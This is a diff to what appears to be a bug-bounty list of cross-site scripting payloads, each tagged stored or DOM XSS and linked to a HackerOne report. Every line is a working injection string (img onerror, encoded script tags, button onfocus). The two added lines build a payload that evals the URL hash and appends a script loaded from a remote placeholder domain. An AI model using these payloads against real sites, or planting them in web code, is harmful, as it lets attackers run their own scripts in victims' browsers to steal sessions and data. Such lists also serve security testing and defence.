@@ -14,4 +14,6 @@ Test <img src=x onerror=alert(2)>|Stored XSS|https://hackerone.com/reports/42045
 #'><img src=x onerror=alert(document.domain)>|DOM XSS|https://hackerone.com/reports/702981
 %27%3E%3Cscript%3Ealert(document.domain)%3C/script%3E|https://hackerone.com/reports/708592
 --><button/autofocus/onfocus=Function("confirm`1`")();//name="XSS|DOM XSS|https://hackerone.com/reports/376027
+<svg onload=eval(location.hash.slice(1))> Put this at the end of the URL:
+#with(document)body.appendChild(createElement('script')).src='//domain'
 
